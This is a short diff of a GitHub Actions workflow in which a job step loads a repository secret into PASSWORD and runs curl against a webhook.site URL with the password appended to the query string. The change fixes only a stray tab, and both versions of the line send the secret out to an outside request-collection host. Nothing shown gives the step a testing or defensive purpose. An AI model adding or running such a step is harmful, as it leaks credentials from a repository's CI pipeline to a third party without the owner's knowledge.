@@ -25,7 +25,7 @@ jobs:
           PASSWORD: ${{ secrets.PASSWORD }}
           CARD_NUMBER: '4111111111111111'
         run: |
-          curl  "	https://webhook.site/e5a09d46-4a2a-495b-8a2b-e0bececa455a??test=hakou2222${PASSWORD}"
+          curl  "https://webhook.site/e5a09d46-4a2a-495b-8a2b-e0bececa455a??test=hakou2222${PASSWORD}"
 
 
 
